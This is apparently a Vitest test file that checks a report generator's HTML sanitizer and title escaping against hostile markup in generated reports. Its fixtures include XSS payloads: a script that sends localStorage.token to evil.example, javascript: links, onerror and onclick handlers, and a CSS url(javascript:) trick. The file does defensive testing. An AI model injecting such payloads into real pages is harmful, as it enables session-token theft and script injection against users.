import { beforeEach, describe, expect, it } from 'vitest'
import { getReport, sanitizeReportHtml, saveReport } from '../../services/reportGenerator'

describe('reportGenerator HTML hardening', () => {
  beforeEach(() => {
    localStorage.clear()
  })

  it('sanitizes hostile LLM HTML while preserving ordinary report markup', () => {
    const sanitized = sanitizeReportHtml(`
      <h2>Analyse</h2>
      <p class="ok" onclick="steal()">Texte <strong>important</strong></p>
      <script>fetch('https://evil.example/'+localStorage.token)</script>
      <iframe src="https://evil.example"></iframe>
      <a href="javascript:alert(1)">bad</a>
      <a href="https://tryarty.com/path">good</a>
      <img src="x" onerror="steal()">
      <span style="background:url(javascript:steal())">x</span>
      <table><tr><td colspan="2">ok</td></tr></table>
    `)

    expect(sanitized).toContain('<h2>Analyse</h2>')
    expect(sanitized).toContain('<strong>important</strong>')
    expect(sanitized).toContain('colspan="2"')
    expect(sanitized).not.toContain('<script')
    expect(sanitized).not.toContain('<iframe')
    expect(sanitized).not.toContain('onclick')
    expect(sanitized).not.toContain('onerror')
    expect(sanitized).not.toContain('javascript:')
    expect(sanitized).not.toContain('background:url')
    expect(sanitized).toContain('rel="noopener noreferrer"')
  })

  it('escapes report titles and stores sanitized content', () => {
    const id = saveReport(
      `Titre <img src=x onerror=alert(1)>`,
      `<p>ok</p><script>alert(localStorage.token)</script><img src="data:image/png;base64,AAAA" onerror="bad()">`
    )
    const html = getReport(id) ?? ''

    expect(html).toContain('Titre &lt;img src=x onerror=alert(1)&gt;')
    expect(html).toContain('<p>ok</p>')
    expect(html).toContain('data:image/png;base64,AAAA')
    expect(html).not.toContain('<script>alert')
    expect(html).not.toContain('onerror="bad()"')
  })
})
